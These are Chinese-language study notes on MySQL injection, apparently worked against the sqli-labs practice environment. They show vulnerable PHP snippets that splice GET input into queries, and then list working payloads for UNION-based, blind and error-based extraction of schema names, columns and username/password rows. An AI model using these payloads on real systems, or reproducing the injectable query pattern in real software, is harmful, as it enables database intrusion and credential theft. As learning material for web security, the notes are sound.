#MYSQL注入笔记
##数据库信息
设数据库```security```里有如下```users```表。

```
mysql> desc users;
+----------+-------------+------+-----+---------+----------------+
| Field    | Type        | Null | Key | Default | Extra          |
+----------+-------------+------+-----+---------+----------------+
| id       | int(3)      | NO   | PRI | NULL    | auto_increment |
| username | varchar(20) | NO   |     | NULL    |                |
| password | varchar(20) | NO   |     | NULL    |                |
+----------+-------------+------+-----+---------+----------------+
3 rows in set (0.00 sec)
```

##构造注入SQL之一【GET - ErrorBased - IntegerBased】
###1. 漏洞代码

大致PHP代码如下

```
$id=$_GET['id'];
$sql="SELECT * FROM users WHERE id=$id LIMIT 0,1";
$result=mysql_query($sql);
$row = mysql_fetch_array($result);

if($row) {
	echo 'Your Login name:'. $row['username'];
	echo "<br>";
	echo 'Your Password:' .$row['password'];
} else {
	print_r(mysql_error());
}
```
通过提交```?id=1 AND 1=1```和```?id=1 AND 1=2```来判断

###2. 猜解字段数

通过``` UNION ALL SELECT NULL```中的```NULL```来猜解表的字段数，例如对于```users```表采用```SELECT *```的话就需要把SQL构造成``` UNION ALL SELECT NULL, NULL, NULL#```，如果采用```SELECT username, password```就只需要``` UNION ALL SELECT NULL, NULL#```就能判断出了。因此如果程序中写的不是```SELECT *```的话，猜解出来的字段数与实际可能不太一样。

###3. 获取MySQL信息

如果想要获取数据库的一些信息可以利用已经显示出来的字段，在构造注入代码的时候将这些信息替换到已经显示的字段里。

例如对于```SELECT * FROM users WHERE id=1```，得到

```
+----+----------+----------+
| id | username | password |
+----+----------+----------+
|  1 | Dumb     | Dumb     |
+----+----------+----------+
1 row in set (0.00 sec)
```

对于```SELECT * FROM users WHERE id=1 UNION ALL SELECT NULL, CURRENT_USER(), NULL LIMIT 0,1;```，还是得到一样的结果。说好的数据库信息呢？

```
+------+----------+----------+
| id   | username | password |
+------+----------+----------+
|    1 | Dumb     | Dumb     |
+------+----------+----------+
1 row in set (0.00 sec)
```

所以还要对```SQL```语句稍加改造```SELECT * FROM users WHERE id=-1 UNION ALL SELECT NULL, CURRENT_USER(), NULL LIMIT 0,1;```就可以得到想要的结果

```
+------+----------------+----------+
| id   | username       | password |
+------+----------------+----------+
| NULL | sqli@localhost | NULL     |
+------+----------------+----------+
1 row in set (0.00 sec)
```
因此如果网页上展示了username，那么就能直接得到当前连接数据库的用户名。因此我们提交的构造代码关键部分为```-1 UNION ALL SELECT NULL, CURRENT_USER(), NULL```。另外需要注意的是构造出来的字段数要与原始正常```SQL```字段数相同。

* 获取当前连接数据库的用户名 ```-1 UNION ALL SELECT NULL, CURRENT_USER(), NULL```
* 获取当前数据库的名字	```-1 UNION ALL SELECT NULL, DATABASE(), NULL```
* 获取当前数据库的版本号 ```-1 UNION ALL SELECT NULL, VERSION(), NULL```
* 获取当前服务器上数据库数量 ```-1 UNION ALL SELECT NULL, (SELECT COUNT(*) FROM information_schema.SCHEMATA), NULL```
* 如果不能直接通过网页得到数据库数量，可以通过```1 AND ORD(MID((SELECT IFNULL(CAST(COUNT(DISTINCT(schema_name)) AS CHAR),CHAR(32)) FROM information_schema.SCHEMATA),1,1)) > ord('1') ```来猜解。
* 猜解表名```1 AND ORD(MID((SELECT DISTINCT(IFNULL(CAST(schema_name AS CHAR),CHAR(32))) FROM information_schema.SCHEMATA LIMIT 0,1),1,1)) > ord('a')``` 当猜解的字母的值只有```>=0```成功时，表示该表名猜解完成。（其中```LIMIT x,y```中```x```表示从第几条记录开始查询，```y```表示最多要查询多少条记录）。通过变动```MID```和```LIMIT```的参数就可以把所有表名猜解完。
* 猜解表的字段数 ```-1 UNION ALL SELECT NULL, (SELECT COUNT(*) FROM information_schema.COLUMNS where table_name='users' AND table_schema='security'), NULL``` 或 ```-1 UNION ALL SELECT NULL, IFNULL(CAST(COUNT(*) AS CHAR),CHAR(32)), NULL FROM information_schema.COLUMNS WHERE table_name=CHAR(117,115,101,114,115) AND table_schema=CHAR(115,101,99,117,114,105,116,121)```
* 逐个猜解字段 ```-1 UNION ALL SELECT NULL, CONCAT(column_name, ' ', column_type), NULL FROM information_schema.COLUMNS where table_name='users' AND table_schema='security' LIMIT 0,1 ``` 或 ```-1 UNION ALL SELECT NULL, CONCAT(IFNULL(CAST(column_name AS CHAR),CHAR(32)), ' ', IFNULL(CAST(column_type AS CHAR),CHAR(32))), NULL FROM information_schema.COLUMNS WHERE table_name=CHAR(117,115,101,114,115) AND table_schema=CHAR(115,101,99,117,114,105,116,121) LIMIT 0,1```
* 猜解记录数```-1 UNION ALL SELECT NULL, IFNULL(CAST(COUNT(*) AS CHAR),CHAR(32)), NULL FROM security.users```
* 逐个获取字段```-1 UNION ALL SELECT NULL, CONCAT(IFNULL(CAST(id AS CHAR),CHAR(32)), ' ',IFNULL(CAST(username AS CHAR),CHAR(32)), ' ', IFNULL(CAST(password AS CHAR),CHAR(32))), NULL FROM security.users LIMIT 0,1```

##构造注入SQL之二【GET - ErrorBased - SingleQuotes - String】
###1.漏洞代码
```
$id=$_GET['id'];
$sql="SELECT * FROM users WHERE id='$id' LIMIT 0,1";
$result=mysql_query($sql);
$row = mysql_fetch_array($result);

if($row) {
	echo 'Your Login name:'. $row['username'];
	echo "<br>";
	echo 'Your Password:' .$row['password'];
} else {
	print_r(mysql_error());
}
```

###2.注入思路
通过提交```?id=1' AND '1'='1```和```?id=1' AND '1'='2```来判断。
其它与IntegerBased相似。如获取当前数据库的名字为```-1' UNION ALL SELECT NULL, DATABASE(), NULL AND '1'='```


##构造SQL注入之三
###1.漏洞代码
```
$id=$_GET['id'];
$sql="SELECT * FROM users WHERE id='$id' LIMIT 0,1";
$result=mysql_query($sql);
$row = mysql_fetch_array($result);

if($row) {
	echo 'You are in...........';
}
else {
	print_r(mysql_error());	
}
```
本代码的特点是不会在网页上输出任何字段值。
###2.注入思路
由于程序代码并不在网页上显示任何字段，因此我们如果想要得到数据库的一些信息得另外想办法。有一个方法是利用程序执行SQL时产生的错误会显示到网页上这一点，将要显示的信息嵌入错误信息里。对于MySQL利用的模板代码为```select count(*), CONCAT(CURRENT_USER(), FLOOR(RAND(0)*2)) x from information_schema.tables group by x;```会得到类似```ERROR 1062 (23000): Duplicate entry 'root@localhost1' for key 'group_key'```的错误提示。